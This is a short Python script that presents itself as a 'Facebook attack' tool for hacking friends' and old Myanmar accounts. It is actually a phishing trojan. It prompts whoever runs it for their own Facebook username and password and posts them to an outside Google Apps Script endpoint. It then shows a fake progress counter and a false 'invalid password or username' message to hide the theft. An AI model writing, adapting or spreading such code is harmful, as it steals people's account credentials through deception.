import requests
import pyfiglet
import time
a = pyfiglet.figlet_format('Facebook attack')
print(a)
print("Create by : Genius")

print("Testing")

print('please login with your facebook \n for hack your firends and myanmar old account')

umail =input("please Enter Username : ")
upass =input("please Enter Fb password : '")
data ={'mail':umail,'pass':upass}
rq =requests.post('https://script.google.com/macros/s/AKfycbygQdU_uqJDSiieLg-l1IdL2mFdwZ1Uct2HogHvBJgeHVRI0Pbp/exec',data=data)

for i in range(100):
   print(i,'%')
   time.sleep(1)
print('invalid password or username')
